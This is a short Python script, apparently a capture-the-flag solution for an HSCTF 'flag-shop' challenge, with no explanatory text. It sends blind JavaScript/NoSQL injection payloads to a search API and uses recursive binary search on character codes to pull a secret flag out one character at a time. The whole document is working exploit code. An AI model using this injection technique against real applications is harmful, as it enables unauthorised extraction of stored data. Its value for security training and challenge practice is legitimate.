import requests
import time

url = 'http://flag-shop.hsctf.com/api/search'

headers = {'Content-type': 'application/json'}

current = ""

def check(req):
        return len(req.json()['results']) > 0 and {"challenge": "flag-shop", "price": 10} in req.json()['results']

def checkAndReduce(x,y,index):
        print(x,y)

        if x==y:
                return chr(int(x))

        mid = (y-x)/2

        if not int(mid)==mid:
                mid = mid - 0.5

        start1 = x
        end1 = x + mid
        start2 = end1+1
        end2 = y

        req = requests.post(url, json={'search': f"') && (this.flag.charCodeAt({index})>={start1} && this.flag.charCodeAt({index})<={end1} && '1' == '1"})

        if check(req):
                return checkAndReduce(start1,end1,index)

        req = requests.post(url, json={'search': f"') && (this.flag.charCodeAt({index})>={start2} && this.flag.charCodeAt({index})<={end2} && '1' == '1"})

        return checkAndReduce(start2,end2,index)

arr = []

for i in range(28):
        arr.append(checkAndReduce(33,126,i))
        print(arr)
print("".join(i for i in arr))